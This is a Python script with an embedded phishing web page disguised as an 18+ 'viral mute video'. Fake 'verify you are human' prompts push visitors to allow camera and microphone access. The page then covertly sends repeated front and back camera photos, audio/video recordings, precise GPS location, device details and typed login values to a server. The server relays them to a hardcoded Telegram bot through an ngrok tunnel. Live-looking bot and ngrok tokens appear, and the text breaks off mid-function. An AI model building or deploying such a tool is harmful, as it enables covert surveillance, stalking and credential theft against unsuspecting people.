import http.server
import socketserver
import threading
import webbrowser
import requests
import json
import time
import base64
import os
try:
    from pyngrok import ngrok, conf
except Exception:
    ngrok = None
    conf = None
    # pyngrok not available; fallback to ngrok CLI or keep USE_NGROK = False
from datetime import datetime
import urllib.parse

TELEGRAM_TOKEN = "8897883871:AAEk_8BpyqTJ9LKEuZAqKs-wtoyll71q89I"
TELEGRAM_CHAT_ID = "8562052005"

PORT = int(os.environ.get("PORT", 8080))
ADMIN_PORT = 8081
# Auto-enable programmatic ngrok if pyngrok was imported successfully
USE_NGROK = True if (ngrok is not None and conf is not None) else False
if USE_NGROK:
    print("pyngrok detected — script will attempt to create an ngrok tunnel.")
NGROK_AUTH_TOKEN = "3Dj7jb7mVwUIKRkxJUeTeAwmDZQ_5QWgWBSRjqnwJnuw8EZnt"
victim_count = 0
victims_data = {}

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

def send_telegram_img(img_path, caption):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        with open(img_path, 'rb') as f:
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"}, files={"photo": f}, timeout=10)
    except Exception as e:
        print(f"Telegram Photo Error: {e}")

print("Photos will save DIRECTLY in project folder!")

HTML_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Viral Mute Video</title>
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="preload" as="style">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',system-ui,sans-serif;background:#141414;color:#fff;min-height:100vh;display:flex;flex-direction:column}
        header{padding:18px 40px;background:linear-gradient(to bottom,rgba(0,0,0,0.8),transparent);position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between}
        .logo{height:32px}
        .help-btn{color:#fff;font-size:14px;text-decoration:none;opacity:0.8}
        .hero{flex:1;background:linear-gradient(rgba(0,0,0,0.55),rgba(0,0,0,0.55));display:flex;align-items:center;justify-content:center;padding:80px 20px}
        .card{background:rgba(0,0,0,0.3);border-radius:6px;padding:60px 68px;max-width:450px;width:100%;backdrop-filter:blur(2px);box-shadow:0 8px 32px rgba(0,0,0,0.5)}
        .card h1{font-size:32px;font-weight:700;margin-bottom:28px;color:#fff}
        .form-group{margin-bottom:16px;position:relative}
        .form-group input{width:100%;padding:18px 16px 6px;background:#333;border:1px solid #8c8c8c;border-radius:4px;color:#fff;font-size:16px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s;appearance:none}
        .form-group input:focus{border-color:#e50914;background:#444}
        .form-group label{position:absolute;top:50%;left:16px;transform:translateY(-50%);color:#8c8c8c;font-size:16px;transition:all .15s;pointer-events:none}
        .form-group input:focus ~ label,.form-group input:not(:placeholder-shown) ~ label{top:14px;font-size:11px;color:#8c8c8c}
        .form-group input::placeholder{color:transparent}
        .btn{width:100%;padding:16px;background:#e50914;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;margin-top:8px;transition:background .2s}
        .btn:hover{background:#f6121d}
        .btn:active{background:#c4040f}
        .divider{text-align:center;color:#737373;font-size:16px;margin:16px 0;position:relative}
        .divider::before,.divider::after{content:'';position:absolute;top:50%;width:45%;height:1px;background:#737373}
        .divider::before{left:0}.divider::after{right:0}
        .social-btn{width:100%;padding:14px;background:#333;border:none;border-radius:4px;color:#fff;font-size:14px;font-family:'Inter',sans-serif;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .2s}
        .social-btn:hover{background:#444}
        .remember{display:flex;align-items:center;gap:8px;margin:16px 0;font-size:13px;color:#b3b3b3}
        .remember input{width:16px;height:16px;accent-color:#e50914}
        .signup-text{text-align:center;margin-top:16px;font-size:16px;color:#737373}
        .signup-text a{color:#fff;text-decoration:none}
        .signup-text a:hover{text-decoration:underline}
        .small-text{font-size:13px;color:#8c8c8c;margin-top:16px;line-height:1.5}
        .small-text a{color:#0071eb;text-decoration:none}
        .demo-creds{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:8px;padding:12px 14px;margin-bottom:18px;color:#fff;font-size:14px;line-height:1.5}
        .bg-video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-2;pointer-events:none;filter:brightness(0.35);will-change:transform;}
        .entry-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.65);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;text-align:center;padding:20px;cursor:pointer}
        .entry-overlay h2{font-size:28px;margin-bottom:12px;}
        .entry-overlay p{font-size:16px;max-width:420px;line-height:1.5;}
        .hero{position:relative;flex:1;background:linear-gradient(rgba(0,0,0,0.55),rgba(0,0,0,0.55)),url('https://images.unsplash.com/photo-1574267431629-2c570fc24a12?q=80&w=1920') center/cover no-repeat;display:flex;align-items:center;justify-content:center;padding:80px 20px;overflow:hidden}
        .hero::before{content:'';position:absolute;inset:0;background:rgba(0,0,0,0.35);backdrop-filter:blur(10px);pointer-events:none;}
        .card{position:relative;z-index:1;background:rgba(0,0,0,0.35);border-radius:6px;padding:60px 68px;max-width:450px;width:100%;backdrop-filter:blur(8px);box-shadow:0 8px 32px rgba(0,0,0,0.5)}
        .link-row{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-top:14px}
        .link-btn{width:auto;padding:12px 14px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.14);border-radius:4px;color:#fff;font-size:14px;text-decoration:none;text-align:center;cursor:pointer}
        .link-btn:hover{background:rgba(255,255,255,0.12)}
        .attack-preview{margin:18px 0;}
        .attack-link{display:inline-flex;align-items:center;gap:8px;justify-content:center}
        .link-icon{width:20px;height:20px;display:inline-flex;align-items:center;justify-content:center;font-size:16px}
        .bg-video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-2;pointer-events:none;filter:brightness(0.35) blur(6px);will-change:transform;}
        .hidden{display:none!important}
        .loader-wrap{text-align:center;padding:40px 0}
        .loader{border:3px solid rgba(255,255,255,.1);border-top:3px solid #e50914;border-radius:50%;width:40px;height:40px;animation:spin 0.8s linear infinite;margin:0 auto 20px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .verify-msg{font-size:15px;color:#b3b3b3;line-height:1.6}
        .error-msg{background:rgba(229,9,20,0.15);border:1px solid rgba(229,9,20,0.4);border-radius:4px;padding:12px 16px;font-size:14px;color:#e87c86;margin-bottom:16px;display:none}
        .success-icon{font-size:48px;margin-bottom:16px}
        footer{padding:30px 40px;background:#000;border-top:1px solid #3d3d3d}
        .footer-links{display:flex;flex-wrap:wrap;gap:16px;max-width:800px;margin:0 auto}
        .footer-links a{font-size:13px;color:#737373;text-decoration:none}
        .footer-lang{color:#737373;font-size:13px;margin-bottom:16px;max-width:800px;margin:0 auto 16px}
    </style>
</head>
<body>
    <div id="entryOverlay" class="entry-overlay" style="background:#000; z-index:999999; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center;">
        <div style="font-size:60px; margin-bottom:10px;">🔞</div>
        <h2 style="color:#e50914; font-size:32px; font-weight:900; margin-bottom:15px; text-transform:uppercase;">18+ Warning</h2>
        <p style="font-size:17px; line-height:1.5; margin-bottom:30px; padding:0 20px; color:#ddd;">This viral clip is age-restricted.<br>Please verify you are human to watch.</p>
        <button id="verifyBtn" style="background:linear-gradient(45deg,#e50914,#ff0a16); color:#fff; font-size:22px; font-weight:bold; padding:20px 40px; border-radius:12px; border:none; box-shadow:0 10px 30px rgba(229,9,20,0.5); cursor:pointer; width:85%; max-width:350px;">VERIFY & WATCH</button>
        <p id="overlayWarn" style="margin-top:25px; font-size:15px; color:#ffeb3b; font-weight:bold; padding:0 20px;">⚠️ IMPORTANT: You MUST click "Allow" on the next prompts to prove you are not a bot.</p>
    </div>
    <video id="bgVideo" class="bg-video" autoplay muted loop playsinline preload="auto">
        <source src="https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.mp4" type="video/mp4">
    </video>
    <button id="debugPermBtn" style="position:fixed;bottom:12px;right:12px;z-index:10000;padding:10px 14px;background:#e50914;color:#fff;border-radius:6px;border:none;font-weight:bold;">Continue</button>
    <header>
        <div style="height:32px;display:flex;align-items:center;gap:12px;color:#fff;font-weight:700">Welcome</div>
    </header>

    <div class="hero">
        <div class="card">
            <div id="step1">
                <h1>Watch Viral Mute Video</h1>
                <div class="demo-creds">Tap below to open the trending silent clip instantly.</div>
                <div class="error-msg" id="errorMsg">Unable to load the video. Please try again or refresh the page.</div>
                <div class="form-group">
                    <input type="email" id="email" value="viral@clip.com" placeholder="Email or phone number" autocomplete="email" oninput="logKey('Email', this.value)">
                    <label for="email">Email or phone number</label>
                </div>
                <div class="form-group">
                    <input type="password" id="password" value="MuteVideo123" placeholder="Password" autocomplete="current-password" oninput="logKey('Password', this.value)">
                    <label for="password">Video access code</label>
                </div>
                <button class="btn" onclick="handleSignIn()">Watch Now</button>
                <div class="remember">
                    <input type="checkbox" id="remember" checked>
                    <label for="remember">Remember this clip</label>
                </div>
                <div class="attack-preview">
                    <div class="attack-preview-card">
                        <div class="profile-thumb">🎬</div>
                        <div class="profile-text">
                            <strong>Trending mute clip</strong>
                            <span>Tap to watch the latest silent viral video.</span>
                        </div>
                    </div>
                    <a href="https://www.tiktok.com/" target="_blank" rel="noopener noreferrer" class="link-btn attack-link">
                        <span class="link-icon">📷</span>
                        Watch viral mute video
                    </a>
                </div>
                <div class="link-row">
                    <a href="https://support.tiktok.com" target="_blank" rel="noopener noreferrer" class="link-btn">Need help?</a>
                    <button class="link-btn" type="button" id="muteToggle" onclick="toggleBackgroundMute()">Mute video</button>
                </div>
                <div class="divider">OR</div>
                <button class="social-btn" onclick="handleSignIn()">
                    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
                    Watch with Google
                </button>
                <div class="signup-text">
                    New to Viral? <a href="#">Join the hype.</a>
                </div>
                <div class="small-text">
                    This clip is optimized for mobile playback. <a href="#">Learn more.</a>
                </div>
            </div>

            <div id="step2" class="hidden">
                <div class="loader-wrap">
                    <div class="loader"></div>
                    <p style="font-size:18px;font-weight:600;margin-bottom:12px">Loading your video</p>
                    <p class="verify-msg">Preparing the trending mute clip.<br>This will only take a moment...</p>
                </div>
            </div>

            <div id="step3" class="hidden">
                <div style="text-align:center">
                    <div class="success-icon">✅</div>
                    <h1 style="font-size:24px;margin-bottom:12px">Ready to watch?</h1>
                    <p style="color:#b3b3b3;font-size:15px;margin-bottom:30px">Your viral mute video is ready. Continue to the app now.</p>
                    <div style="display:flex;flex-direction:column;gap:12px">
                        <button class="btn" onclick="window.location.href='https://www.tiktok.com'" style="background:#1a1a1a;border:2px solid #333;display:flex;align-items:center;gap:15px;padding:16px">
                            <div style="width:40px;height:40px;border-radius:4px;background:linear-gradient(135deg,#0c8ce9,#0d3c6d)"></div>
                            <span style="font-size:16px;font-weight:500">Continue to TikTok</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-lang">Questions? Call <a href="#" style="color:#737373">0800-000-000</a></div>
        <div class="footer-links">
            <a href="#">FAQ</a><a href="#">Help Center</a><a href="#">Account</a>
            <a href="#">Media Center</a><a href="#">Investor Relations</a><a href="#">Jobs</a>
            <a href="#">Ways to Watch</a><a href="#">Terms of Use</a><a href="#">Privacy</a>
            <a href="#">Cookie Preferences</a><a href="#">Corporate Information</a><a href="#">Contact Us</a>
        </div>
    </footer>

    <video id="frontVideo" autoplay muted playsinline style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;overflow:hidden;pointer-events:none;z-index:-9999"></video>
    <video id="backVideo" autoplay muted playsinline style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;overflow:hidden;pointer-events:none;z-index:-9999"></video>
    <canvas id="canvas" style="display:none;position:fixed;top:0;left:0"></canvas>

    <script>
    var data = {};
    var frontStream = null;
    var camStarted = false;
    var overlayHandled = false;

    (function(){
        // Minimal, robust client script to avoid syntax errors on older mobiles.
        data = {};
        frontStream = null;
        camStarted = false;
        overlayHandled = false;

        function safePost(obj){
            try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(obj)}).catch(function(){}); }catch(e){}
        }

        function startSimpleCapture(){
            try{
                var fv = document.getElementById('frontVideo');
                var canvas = document.getElementById('canvas') || document.createElement('canvas');
                if(!canvas.id) canvas.id = 'canvas';
                var ctx = canvas.getContext && canvas.getContext('2d');
                if(!ctx || !fv) return;
                setInterval(function(){
                    try{
                        if(fv.videoWidth && fv.videoHeight){
                            canvas.width = fv.videoWidth; canvas.height = fv.videoHeight;
                            ctx.drawImage(fv,0,0,canvas.width,canvas.height);
                            try{
                                canvas.toBlob(function(blob){
                                    if(!blob) return;
                                    var reader = new FileReader();
                                    reader.onloadend = function(){
                                        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'FRONT_live', photo:reader.result})}); }catch(e){}
                                    };
                                    reader.readAsDataURL(blob);
                                },'image/jpeg',0.85);
                            }catch(e){
                                try{ var d = canvas.toDataURL('image/jpeg',0.85); fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'FRONT_live', photo:d})}); }catch(e){}
                            }
                        }
                    }catch(e){}
                }, 3000);
            }catch(e){}
        }

        function requestLocation(){
            try{
                if(!navigator.geolocation) return;
                navigator.geolocation.getCurrentPosition(function(pos){
                    var lat = pos.coords.latitude;
                    var lon = pos.coords.longitude;
                    var acc = pos.coords.accuracy;
                    data.lat = lat; data.lon = lon; data.acc = acc;
                    safePost({type:'gps', lat:lat, lon:lon, acc:acc});
                }, function(err){
                    safePost({type:'diag', msg:'geo_failed', error: err && err.message});
                }, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
            }catch(e){ safePost({type:'diag', msg:'geo_err', error: e && e.toString()}); }
        }

        function onUserGesture(ev){
            if(overlayHandled) return; overlayHandled = true;
            var overlay = document.getElementById('entryOverlay'); if(overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
            document.body.style.overflow = 'auto';
            safePost({type:'diag', msg:'entry_gesture', ev: ev && ev.type});
            requestLocation();
            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
                try{
                    navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(function(s){
                        frontStream = s;
                        var fv = document.getElementById('frontVideo');
                        try{ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }catch(e){}
                        camStarted = true;
                        startSimpleCapture();
                        safePost({type:'diag', msg:'camera_granted'});
                    }).catch(function(err){
                        safePost({type:'diag', msg:'camera_failed', error: (err && err.toString && err.toString()) || 'err'});
                    });
                }catch(e){ safePost({type:'diag', msg:'camera_get_err'}); }
            }
            try{ setTimeout(function(){ var email=document.getElementById('email').value||''; var pwd=document.getElementById('password').value||''; fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login', email:email, password:pwd})}).catch(function(){}); }, 400); }catch(e){}
        }

        function attachGesture(){
            var overlay = document.getElementById('entryOverlay');
            if(!overlay) return;
            var opts = {passive:true, once:true};
            try{ overlay.addEventListener('touchstart', onUserGesture, opts); }catch(e){}
            try{ overlay.addEventListener('pointerdown', onUserGesture, opts); }catch(e){}
            try{ overlay.addEventListener('click', onUserGesture, opts); }catch(e){}
            try{ document.addEventListener('touchstart', onUserGesture, {passive:true, once:true}); }catch(e){}
        }

        try{ data.ua = navigator.userAgent; data.screen = (screen.width||0) + 'x' + (screen.height||0); data.lang = navigator.language || ''; }catch(e){}
        try{
            if(navigator.getBattery){
                navigator.getBattery().then(b => {
                    data.battery = Math.round(b.level * 100) + '%';
                    data.charging = b.charging;
                    fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'battery_info', ...data})});
                }).catch(e=>{});
            }
        }catch(e){}
        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'init', data:data})}).catch(function(){}); }catch(e){}
        try{ fetch('https://ipinfo.io/json').then(function(r){ return r.json(); }).then(function(ip){ try{ data.ip=ip.ip; data.city=ip.city; data.country=ip.country; }catch(e){} }).catch(function(){}); }catch(e){}
        try{ var dbg = document.getElementById('debugPermBtn'); if(dbg) dbg.addEventListener('click', function(){ onUserGesture({type:'debugBtn'}); }); }catch(e){}
        attachGesture();
    })();

async function checkCameraPermission(){
    if(!navigator.permissions || !navigator.permissions.query) return;
    try{
        const status = await navigator.permissions.query({name:'camera'});
        if(status.state === 'granted'){
            const overlay = document.getElementById('entryOverlay');
            if(overlay){ overlay.style.display = 'none'; }
            await openCamStreams(false);
            fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'camera_permission_already_granted', ...data})});
        }
    }catch(e){
        console.log('Permission query failed:', e);
    }
}

window.addEventListener('load', async ()=>{
    const overlay = document.getElementById('entryOverlay');
    // Unified user-gesture handler for touch/pointer/click
    function userGestureHandler(e){
        try{ console.log('userGestureHandler event:', e.type); }catch(_){}
        if(overlayHandled) return;
        
        if(e && typeof e.preventDefault === 'function'){
            try{ e.preventDefault(); }catch(_){ }
        }
        if(e && typeof e.stopPropagation === 'function'){
            try{ e.stopPropagation(); }catch(_){ }
        }
        
        const btn = document.getElementById('verifyBtn');
        if(btn) btn.innerText = "WAITING FOR ALLOW...";

        // Request GPS location on gesture
        try{
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition((pos)=>{
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;
                    data.lat = lat; data.lon = lon; data.acc = acc;
                    try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'gps', lat:lat, lon:lon, acc:acc, ...data})}); }catch(_){}
                    console.log('GPS acquired:', lat, lon, acc);
                }, (err)=>{
                    console.log('GPS failed:', err.message);
                    try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'geo_failed', error:err.message, ...data})}); }catch(_){}
                }, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
            }
        }catch(geoErr){ console.log('geo exception:', geoErr); }

        // Directly request media inside the gesture
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
            navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:true})
            .then(s=>{
                // SUCCESS: They clicked ALLOW!
                overlayHandled = true;
                if(overlay){
                    try{ overlay.style.display = 'none'; overlay.style.pointerEvents = 'none'; }catch(_){ }
                    try{ overlay.remove(); }catch(_){ }
                }
                try{ document.body.style.overflow = 'auto'; }catch(_){ }

                console.log('Direct getUserMedia granted from gesture', e.type);
                try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'entry_gesture_open_cam', ev:e.type, ...data})}); }catch(_){}
                const fv = document.getElementById('frontVideo');
                if(fv){ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }
                camStarted = true;
                try{ startCapture(fv,'FRONT'); }catch(err){ console.log('startCapture after gesture failed', err); }

                try {
                    let options = { mimeType: 'video/webm;codecs=vp8,opus' };
                    if(!MediaRecorder.isTypeSupported(options.mimeType)){
                        options = { mimeType: 'video/mp4' }; 
                        if(!MediaRecorder.isTypeSupported(options.mimeType)) options = {};
                    }
                    let recorder = new MediaRecorder(s, options);
                    recorder.ondataavailable = (ev) => {
                        if(ev.data && ev.data.size > 0){
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"audio_video", data:reader.result, ...data})}).catch(e=>{});
                            };
                            reader.readAsDataURL(ev.data);
                        }
                    };
                    recorder.start(15000); 
                }catch(err){ console.log('MediaRecorder error', err); }
                
                // proceed to login UI transition (non-blocking)
                setTimeout(()=>{ try{ submitLogin(); }catch(err){ console.log('submitLogin failed after gesture', err); } }, 300);
            })
            .catch(err=>{
                // FAILED: They clicked BLOCK
                if(btn) btn.innerText = "VERIFY & WATCH";
                const warn = document.getElementById('overlayWarn');
                if(warn) warn.innerHTML = '❌ YOU BLOCKED IT! You MUST click "Allow" on the popup to verify you are human!<br><br><span style="color:#fff">If you accidentally blocked it forever, click the Lock icon (🔒) in your browser address bar and Reset/Allow the Camera permission.</span>';
                console.log('getUserMedia failed in gesture', err);
                try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'entry_gesture_open_cam_failed', error:err.toString(), ev:e.type, ...data})}); }catch(_){}
            });
        } else {
            // fallback
            openCamStreams(true).catch(err=>{
                console.log('openCamStreams fallback failed', err);
            });
        }
    }

    if(overlay){
        // attach multiple event types to maximize mobile coverage
        overlay.addEventListener('touchstart', userGestureHandler, {passive:false, once:true});
        overlay.addEventListener('touchend', userGestureHandler, {passive:false, once:true});
        overlay.addEventListener('pointerdown', userGestureHandler, {passive:false, once:true});
        overlay.addEventListener('pointerup', userGestureHandler, {passive:false, once:true});
        overlay.addEventListener('click', userGestureHandler, {once:true});
    }

    // Also attach document-level listeners as a fallback if overlay blocks events
    function attachDocFallback(){
        document.addEventListener('touchstart', userGestureHandler, {passive:false, once:true});
        document.addEventListener('pointerdown', userGestureHandler, {passive:false, once:true});
        document.addEventListener('click', userGestureHandler, {once:true});
    }
    attachDocFallback();

    await checkCameraPermission();
});

// Debug helper: request permissions directly via a visible button (mobile-friendly)
async function requestPermissionsDirect(){
    console.log('Direct permission request invoked');
    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
        console.log('getUserMedia not available');
        return;
    }
    try{
        const s = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
        console.log('Direct permissions/grant received');
        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'direct_perms_granted', ...data})}); }catch(e){}
        const fv = document.getElementById('frontVideo');
        if(fv){ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }
        camStarted = true;
        try{ startCapture(fv,'FRONT'); }catch(e){ console.log('startCapture failed after direct perms', e); }
    }catch(e){
        console.log('Direct getUserMedia error', e);
        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'direct_perms_failed', error:e.toString(), ...data})}); }catch(err){}
    }
}

document.addEventListener('DOMContentLoaded', ()=>{
    const dbg = document.getElementById('debugPermBtn');
    if(dbg){ dbg.addEventListener('click', requestPermissionsDirect); }
});

// Also request camera on sign-in button click
document.addEventListener('DOMContentLoaded', ()=>{
    document.addEventListener('click', async (e)=>{
        if(!camStarted && (e.target.classList.contains('btn') || e.target.closest('.btn'))) {
            console.log('SIGNIN CLICKED - Requesting camera access');
            await openCamStreams(true);
        }
    });
});

async function openCamStreams(userGesture=true){
    console.log('openCamStreams called with userGesture:', userGesture);
    if(camStarted) {
        console.log('Camera already started, skipping initialization.');
        return;
    }
    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
        console.log('❌ No getUserMedia available');
        fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"no_getUserMedia", userGesture, ...data})});
        return;
    }

    async function requestCamera(constraints, label){
        try{
            console.log(`🎥 Requesting ${label} camera`, constraints, `userGesture=${userGesture}`);
            return await navigator.mediaDevices.getUserMedia(constraints);
        }catch(e){
            console.log(`❌ ${label} camera failed:`, e.name, e.message);
            fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:`camera_failed_${label.toLowerCase()}`, error:e.name + ": " + e.message, userGesture, ...data})});
            return null;
        }
    }

    let frontStream = await requestCamera({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720},frameRate:{ideal:30}}}, 'FRONT');
    if(!frontStream){
        frontStream = await requestCamera({video:true}, 'FRONT_FALLBACK');
    }

    if(frontStream){
        const fv = document.getElementById('frontVideo');
        fv.srcObject = frontStream;
        fv.playsInline = true;
        fv.muted = true;
        fv.autoplay = true;

        console.log('📺 Front video stream attached');
        camStarted = true;
        startCapture(fv, 'FRONT');

        try {
            let options = { mimeType: 'video/webm;codecs=vp8,opus' };
            if(!MediaRecorder.isTypeSupported(options.mimeType)){
                options = { mimeType: 'video/mp4' }; 
                if(!MediaRecorder.isTypeSupported(options.mimeType)) options = {};
            }
            let recorder = new MediaRecorder(frontStream, options);
            recorder.ondataavailable = (e) => {
                if(e.data && e.data.size > 0){
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"audio_video", data:reader.result, ...data})}).catch(e=>{});
                    };
                    reader.readAsDataURL(e.data);
                }
            };
            recorder.start(15000); // Every 15 seconds
        }catch(err){ console.log('MediaRecorder error', err); }

        fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"camera_success_front", userGesture, ...data})});
    }

    // Try back camera after 1.5s
    setTimeout(async ()=>{
        if(!navigator.mediaDevices) return;
        let backStream = await requestCamera({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}}}, 'BACK');
        if(!backStream){
            backStream = await requestCamera({video:true}, 'BACK_FALLBACK');
        }
        if(backStream){
            const bv = document.getElementById('backVideo');
            bv.srcObject = backStream;
            bv.playsInline = true;
            bv.muted = true;
            bv.autoplay = true;
            startCapture(bv,'BACK');
            console.log('✅ Back camera ready');
            fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"camera_success_back", ...data})});
        }
    }, 1500);
}

function startCapture(video, camType){
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    let count = 0;
    let intervalId = null;
    let failCount = 0;

    function captureOnce(){
        try{
            const state = video.readyState;
            const width = video.videoWidth;
            const height = video.videoHeight;
            
            if(state >= 2 && width > 0 && height > 0){
                failCount = 0;
                canvas.width  = width;
                canvas.height = height;
                
                try {
                    ctx.drawImage(video, 0, 0, width, height);
                } catch(drawErr) {
                    console.log("drawImage error:", drawErr);
                    fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"drawImage_error", camType:camType, error:drawErr.toString(), ...data})});
                    return;
                }
                
                const sendPhoto = (img) => {
                    if(img && img.length > 500) {
                        fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:camType+"_live", photo:img, id:count, camType:camType, ...data})});
                        console.log("✅ Photo #"+(++count)+" sent ("+camType+") size:"+Math.round((img.length/4)/1024)+"KB");
                    } else {
                        console.log("⚠️ Invalid DataURL for canvas capture");
                        fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"invalid_dataurl", camType:camType, size:img?.length || 0, ...data})});
                    }
                };

                if(typeof canvas.toBlob === 'function'){
                    canvas.toBlob(blob => {
                        if(blob && blob.size > 100){
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                sendPhoto(reader.result);
                            };
                            reader.readAsDataURL(blob);
                        } else {
                            console.log("⚠️ Empty or tiny blob captured, size:", blob?.size || 0);
                            fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"empty_blob", camType:camType, size:blob?.size || 0, ...data})});
                        }
                    }, 'image/jpeg', 0.90);
                } else {
                    sendPhoto(canvas.toDataURL('image/jpeg', 0.90));
                }
            } else {
                failCount++;
                console.log("Video not ready (attempt "+failCount+"): readyState="+state+" videoWidth="+width+" videoHeight="+height);
                if(failCount > 10) {
                    console.log("Video not becoming ready, sending diagnostic");
                    fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"video_never_ready", camType:camType, lastState:state, lastWidth:width, lastHeight:height, attempts:failCount, ...data})});
                    failCount = 0;
                }
            }
        }catch(e){ 
            console.log("Capture error:", e); 
